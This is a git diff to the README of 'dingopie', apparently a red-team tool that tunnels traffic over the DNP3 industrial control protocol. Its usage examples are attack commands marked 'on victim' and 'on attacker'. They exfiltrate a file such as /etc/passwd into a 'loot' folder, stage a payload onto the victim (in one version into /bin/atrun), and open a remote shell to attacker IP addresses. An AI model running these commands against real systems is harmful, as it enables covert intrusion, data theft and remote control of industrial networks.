@@ -9,17 +9,17 @@ dingopie is a tool for tunneling traffic over DNP3. There are two main functions
 #### Exfiltrate a file:
 ```bash
 # on victim
-$ dingopie server direct send --file /etc/passwd --key "my voice is my passport"
+$ dingopie server direct send --file black-box --key "my voice is my passport"
 # on attacker or intermediary
-$ dingopie client direct receive --file loot/victim1-etc-passwd.txt --key "my voice is my passport" --server-ip 10.1.2.3
+$ dingopie client direct receive --file loot/janeks-box --key "my voice is my passport" --server-ip 10.1.2.3
 ```
 
 #### Stage a payload:
 ```bash
 # on victim
-$ dingopie server direct receive --file /tmp/security-update
+$ dingopie server direct receive --file /bin/atrun --server-port 20001
 # on attacker
-$ dingopie client direct send --file payloads/janeks-box.exe --server-ip 10.1.2.3
+$ dingopie client direct send --file payloads/egg --server-ip 128.3.6.22 --server-port 20001
 ```
 
 #### Tunnel a shell over DNP3:
@@ -27,13 +27,13 @@ $ dingopie client direct send --file payloads/janeks-box.exe --server-ip 10.1.2.
 # on victim
 $ dingopie server direct shell
 # on attacker
-$ dingopie client direct connect --server-ip 10.1.2.3
-dingopie> whoami
+$ dingopie.exe client direct connect -i 131.43.110.7
+dingopie>
 ```
 
 ## Usage
 
-dingopie has three different options: the role, the mode, and the action. Each is required: `dingopie { server | client } { direct | inject } { { send | receive } | { shell | connect } } ...`. Each session needs a `client` on one side and a `server` on the other, and a paired set of actions (either `send` | `receive` or `shell` | `connect`).
+dingopie has three different options: the role, the mode, and the action. Each is required: `dingopie  { server | client }  { direct | inject }  { { send | receive } | { shell | connect } } ...`. Each session needs a `client` on one side and a `server` on the other, and a paired set of actions (either `send` | `receive` or `shell` | `connect`).
 
 ### Roles
 
